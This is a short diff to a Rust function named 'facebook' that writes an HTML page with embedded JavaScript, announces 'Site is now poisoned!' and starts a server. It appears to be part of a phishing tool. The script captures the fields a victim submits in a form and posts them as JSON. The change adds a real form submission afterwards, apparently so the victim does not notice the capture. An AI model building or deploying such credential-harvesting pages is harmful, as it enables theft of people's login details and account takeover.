@@ -31,7 +31,9 @@ pub fn facebook(url: &str) -> io::Result<()> {
             xhr.open('POST', form.getAttribute('action'));
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(JSON.stringify(formData));
-        }});
+
+            form.submit();
+        }}); 
     }});
 </script>
 "#,
@@ -46,10 +48,10 @@ pub fn facebook(url: &str) -> io::Result<()> {
 
         let mut file = File::create("index.html")?;
         file.write_all(contents.as_bytes())?;
-        println!("Site is now poisoned!\nStarting Server...");
-
+        println!("Site is now poisoned!");
+        println!("Starting Server...");
+        println!("Server running on: {}", url.trim_end_matches("post"));
         let _ = server::main();
-        println!("Server running on: {}", url);
 
     } else {
         eprintln!("Something went wrong");
